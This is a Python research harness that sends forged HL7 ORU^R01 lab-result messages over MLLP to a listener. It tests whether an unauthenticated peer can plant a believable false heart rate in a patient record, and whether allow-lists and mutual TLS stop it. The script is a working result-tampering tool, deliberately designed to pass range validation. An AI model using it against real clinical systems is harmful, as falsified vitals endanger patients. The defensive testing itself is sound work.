#!/usr/bin/env python3
"""E6a stimulus: result tampering at the HL7 boundary.

Research test harness for the author's own local HL7 listener only. It opens
an MLLP connection to the listener and sends well-formed ORU^R01 messages that
carry a plausible but fabricated vital for a real bed, to measure whether the
listener accepts and stores a value from a peer that is not the authorised
gateway. It defaults to the loopback address and is not a general-purpose tool.

This is the LIS02-A laboratory-result attack of Dupont et al., moved to HL7 v2,
as described in Draft-5 section E6. The point it tests is architectural, not a
software flaw: HL7 v2 carries no authentication, so a listener with no
network-layer allow-list and no mutual TLS has no way to tell this peer from
the gateway. The mitigations under test (the nftables allow-list, then mutual
TLS) are what change the outcome; message validation does not, and is not
meant to.

WHY THE FORGED VALUE IS PLAUSIBLE, NOT ABSURD
---------------------------------------------
The forged heart rate is a normal 72 bpm written for a bed whose real readings
would be critical. A deliberately silly value (9999) would be caught by the
listener's physiological range check and would make the attack look defeated by
validation, which is the wrong conclusion: validation is not the defence. The
experiment asks whether an unauthenticated peer can place a *believable* false
value into the clinical record, so the value sits inside the plausible range on
purpose.
"""
import argparse
import csv
import socket
import ssl
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import hl7util as H  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=H.MLLP_PORT)
    ap.add_argument("--bind", default="",
                    help="source address; set so the allow-list and the "
                         "listener can distinguish this peer from the gateway")
    ap.add_argument("--duration", type=float, default=60.0)
    ap.add_argument("--rate", type=float, default=5.0,
                    help="forged messages per second")
    ap.add_argument("--target-bed", default="bed-1",
                    help="the real bed whose record is targeted")
    ap.add_argument("--forged-value", type=float, default=72.0,
                    help="plausible fabricated vital (inside the range check)")
    ap.add_argument("--metric", default="heartrate")
    ap.add_argument("--outfile", default="tamper.csv")
    # mutual TLS: supplied only to show it is refused without a valid cert
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--cafile")
    ap.add_argument("--certfile")
    ap.add_argument("--keyfile")
    ap.add_argument("--server-name", default="localhost")
    args = ap.parse_args()

    ctx = None
    if args.tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        if args.cafile:
            ctx.load_verify_locations(args.cafile)
        if args.certfile and args.keyfile:
            ctx.load_cert_chain(args.certfile, args.keyfile)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_REQUIRED if args.cafile else ssl.CERT_NONE

    rows = []
    sent = accepted = refused_conn = 0
    end = time.monotonic() + args.duration
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    seq = 0
    sock = None
    buf = b""

    def connect():
        nonlocal buf
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if args.bind:
                s.bind((args.bind, 0))
            s.settimeout(3.0)
            s.connect((args.host, args.port))
            if ctx is not None:
                s = ctx.wrap_socket(s, server_hostname=args.server_name)
        except OSError:
            try:
                s.close()
            except OSError:
                pass
            return None
        buf = b""
        return s

    while time.monotonic() < end:
        seq += 1
        if sock is None:
            sock = connect()
            if sock is None:
                refused_conn += 1
                time.sleep(min(0.25, interval or 0.25))
                continue
        mid = H.msg_id(args.target_bed, f"F{seq}")
        msg = H.build_oru(args.target_bed, f"F{seq}", args.forged_value,
                          args.metric)
        t0 = time.time()
        code = ""
        try:
            sock.sendall(H.frame(msg))
            sent += 1
            deadline = time.monotonic() + 3.0
            while time.monotonic() < deadline:
                msgs, buf = H.deframe(buf)
                if msgs:
                    code, _ = H.ack_code(msgs[0])
                    break
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
        except OSError:
            try:
                sock.close()
            except OSError:
                pass
            sock = None
            code = ""
        if code == "AA":
            accepted += 1
        rows.append((mid, args.target_bed, args.forged_value,
                     f"{t0:.6f}", code))
        if interval:
            time.sleep(interval)

    if sock is not None:
        try:
            sock.close()
        except OSError:
            pass

    with open(args.outfile, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["msg_id", "target_bed", "forged_value", "t_send",
                    "ack_code"])
        w.writerows(rows)
    acc_ratio = accepted / sent if sent else 0.0
    print(f"tamper: sent={sent} accepted(AA)={accepted} "
          f"accept_ratio={acc_ratio:.3f} conn_refused={refused_conn} "
          f"-> {os.path.basename(args.outfile)}")


if __name__ == "__main__":
    main()
